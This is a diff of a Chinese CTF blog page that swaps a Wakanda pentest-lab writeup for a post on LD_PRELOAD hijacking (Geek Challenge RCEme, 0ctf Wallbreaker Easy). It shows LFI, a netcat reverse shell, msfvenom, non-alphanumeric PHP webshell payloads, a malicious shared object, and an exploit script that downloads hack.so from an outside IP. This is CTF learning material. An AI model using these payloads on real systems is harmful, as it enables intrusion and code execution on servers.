@@ -82,18 +82,20 @@
 
 
 
-<meta name="description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta name="description" content="贴几个参考链接 https://www.cnblogs.com/wfzWebSecuity/p/11213732.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 极客大挑战 RCEme 1234567891011121314151617 &amp;lt;?phperror_reporting(0);if(i">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Wakanda靶机渗透">
-<meta property="og:url" content="http://yoursite.com/2019/04/22/Wakanda靶机渗透/index.html">
+<meta property="og:title" content="LD_PRELOAD劫持类型题目">
+<meta property="og:url" content="http://yoursite.com/2019/12/26/LD-PRELOAD劫持类型题目/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta property="og:description" content="贴几个参考链接 https://www.cnblogs.com/wfzWebSecuity/p/11213732.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 极客大挑战 RCEme 1234567891011121314151617 &amp;lt;?phperror_reporting(0);if(i">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-06T07:45:40.000Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png">
+<meta property="og:updated_time" content="2019-12-26T08:50:15.673Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Wakanda靶机渗透">
-<meta name="twitter:description" content="首先发现主机：netdiscover或者arp-scan -l，发现靶机 然后nmap -sS -p- (victim_url)，开放的端口有80，111，3333. 访问以下80端口，源码中有一行注释： 1&amp;lt;!--herf=&amp;quot;?lang=fr&amp;quot;--&amp;gt; 尝试给访问url/?lang=fr，发现页面的语言变成了法语。考虑文件包含，访问url/?lang=php://f">
+<meta name="twitter:title" content="LD_PRELOAD劫持类型题目">
+<meta name="twitter:description" content="贴几个参考链接 https://www.cnblogs.com/wfzWebSecuity/p/11213732.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 极客大挑战 RCEme 1234567891011121314151617 &amp;lt;?phperror_reporting(0);if(i">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png">
 
 
 
@@ -123,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/22/Wakanda靶机渗透/">
+  <link rel="canonical" href="http://yoursite.com/2019/12/26/LD-PRELOAD劫持类型题目/">
 
 
 
 
 
-  <title>Wakanda靶机渗透 | CH4SER || 自闭室</title>
+  <title>LD_PRELOAD劫持类型题目 | CH4SER || 自闭室</title>
   
 
 
@@ -288,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/Wakanda靶机渗透/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/26/LD-PRELOAD劫持类型题目/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ch4ser">
@@ -305,7 +307,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Wakanda靶机渗透</h1>
+          <h1 class="post-title" itemprop="name headline">LD_PRELOAD劫持类型题目</h1>
         
 
         <div class="post-meta">
@@ -317,8 +319,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T03:07:27+08:00">
-                2019-04-22
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-26T16:37:19+08:00">
+                2019-12-26
               </time>
             
 
@@ -333,34 +335,12 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-06T15:45:40+08:00">
-                2019-08-06
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-26T16:50:15+08:00">
+                2019-12-26
               </time>
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/靶机渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -383,7 +363,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  694
+                  1k
                 </span>
               
 
@@ -399,7 +379,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  2
+                  4
                 </span>
               
             </div>
@@ -420,28 +400,44 @@
       
 
       
-        <p>首先发现主机：<code>netdiscover</code>或者<code>arp-scan -l</code>，发现靶机</p>
-<p>然后<code>nmap -sS -p- (victim_url)</code>，开放的端口有80，111，3333.<br>
-访问以下80端口，源码中有一行注释：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--herf=&quot;?lang=fr&quot;--&gt;</span><br></pre></td></tr></table></figure>
-<p>尝试给访问<code>url/?lang=fr</code>，发现页面的语言变成了法语。考虑文件包含，访问<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(index和index.php都要试一下)。<br>
-解码之后得到源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里有一个密码，然后在之前的网页中，可以看见最下方有一个用户名，尝试用这个用户名和密码去ssh登陆。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mamadou@(url) -p 3333</span><br></pre></td></tr></table></figure>
-<p>然后输入密码就可以连接进入靶机了。进入之后发现是一个python的交互界面，这个时候可以调用<code>pty</code>库来进入交互式的<code>shell</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawm(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>
-<p>这样子我们就来到了bash，并拿到了第一个flag，尝试使用命令<code>sudo -l</code>来查看当前用户<code>所能执行的root用户命令</code>，结果并没有可执行的root命令。查看有没有其他用户(可以通过查看<code>/etc/passwd</code>或者<code>/home</code>目录下的用户得知用户信息)。发现有一个叫做<code>devops</code>的用户，通过<code>find / -user devops 2&gt;/dev/null</code>来发现<code>devops</code>的文件，发现第二个flag，同时还有一个<code>.antivirus.py</code>文件。</p>
-<p>进入发现源代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>
-<p>我们将那个test文件删掉之后过一段时间又会出现，然后结合py的文件名，可以推测这个脚本会隔一段时间执行一次。<br>
-那么我们可以利用这个来反弹shell。改写改py文件如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"nc (my_host) -p 4444 -e '/bin/bash' -i"</span>)</span><br></pre></td></tr></table></figure>
-<p>然后其他的writeup中是这样利用的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=4444 R</span><br></pre></td></tr></table></figure>
-<p>然后把生成的<code>poc</code>写进py文件中来。<br>
-然后在自己的攻击机上开启nc,<code>nc -lvp 4444</code>由于py文件执行的时候，执行的身份是<code>devops</code>所以我们得到的是devops的shell，可以查看第二个flag的内容了。</p>
-<p>然后<code>sudo -l</code>查看该用户可用的管理员命令，发现一个<code>pip</code>可以执行，然后有一个<code>Fakepip</code>的脚本可以利用，在攻击机上把脚本给下载过来，然后在脚本目录下运行<code>sudo python -m SimpleHttpServer 80</code>来运行简单的<code>python http</code>服务，然后在靶机上运行<code>wget http://(attacker url)/setup.py</code>来把Fakepip中的setup脚本传输过去。记得在传输之前修改setup脚本中的lhost和lport，<a href="http://xn--setup-4n1h846arhg5r4bh4ut71dw3sgxw.py" target="_blank" rel="noopener">然后在靶机中运行setup.py</a>，同时在攻击机上面运行<code>nc -lvp 4444</code>接受shell，然后就得到了root权限</p>
+        <p>贴几个参考链接</p>
+<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11213732.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11213732.html</a></p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<h1>极客大挑战 RCEme</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>首先是个无字母数字shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()</span><br></pre></td></tr></table></figure>
+<p>很遗憾的发现system等函数都不能执行.</p>
+<p>上蚁剑,但是很奇怪的不能直接用密码__来连接, 要这样连, 不然会有奇怪的东西显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_POST[a])</span><br></pre></td></tr></table></figure>
+<p>…原来一定要eval么…</p>
+<p>然后发现根目录下有无读权限的flag和一个readflag二进制文件.</p>
+<p>连上之后向/tmp目录下面写两个东西, 一个是本地生成的so文件,</p>
+<p>hack.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC hack.c -o hack.so</span><br></pre></td></tr></table></figure>
+<p>拖上去就行了</p>
+<p>ch4ser.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后包含代码去执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=include("/tmp/ch4ser.php")</span></span><br></pre></td></tr></table></figure>
+<p><code>mail</code>函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了</p>
+<h1>0ctf Wallbreaker Easy</h1>
+<p>这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。</p>
+<p>在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。</p>
+<h2 id="主要思路">主要思路</h2>
+<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是<code>/readflag &gt; {dir}/flag</code>啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.63.208:31340/"</span></span><br><span class="line">dir = <span class="string">"/tmp/ef757c06e983a137384378f47607abfa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare?</span></span><br><span class="line"><span class="comment">#the new Imagick('&#123;filename&#125;') beginning with no work,but didnot after replace'''to '"',also disapeared after sovled it</span></span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo 'hello';?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$dir = "&#123;0&#125;";</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));</span></span><br><span class="line"><span class="string">chmod("&#123;0&#125;/hack.so",0777);</span></span><br><span class="line"><span class="string">putenv("LD_PRELOAD=&#123;0&#125;/hack.so");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser.wmv","sssss");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser","");</span></span><br><span class="line"><span class="string">$tocken = new Imagick('&#123;0&#125;/ch4ser.wmv');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents('%s/evil',base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/evil";</span></span><br><span class="line"><span class="string">'''</span>%(dir,base64.b64encode(cmd),dir)</span><br><span class="line"></span><br><span class="line">print(requests.post(url, data=&#123;<span class="string">'backdoor'</span>: payload &#125;).content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"print_r(scandir('%s'));"</span>%dir&#125;).content</span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"echo file_get_contents('%s/ch4ser');"</span>%dir&#125;).content</span><br></pre></td></tr></table></figure>
+<p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
+<p>然后服务器上面的<code>hack.c</code>文件如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
+<blockquote>
+<p>ps:每个人的目录会不定时被服务器清空</p>
+</blockquote>
 
       
     </div>
@@ -466,8 +462,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/22/minuv1渗透/" rel="next" title="minuv1靶机渗透记录(存疑)">
-                <i class="fa fa-chevron-left"></i> minuv1靶机渗透记录(存疑)
+              <a href="/2019/12/19/qwb-copperstudy-record/" rel="next" title="copperstudy-record">
+                <i class="fa fa-chevron-left"></i> copperstudy-record
               </a>
             
           </div>
@@ -475,10 +471,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/22/适用hexo搭建博客/" rel="prev" title="使用hexo和github搭建网站">
-                使用hexo和github搭建网站 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -530,8 +522,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -626,6 +627,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">极客大挑战 RCEme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">0ctf Wallbreaker Easy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#主要思路"><span class="nav-number">2.1.</span> <span class="nav-text">主要思路</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
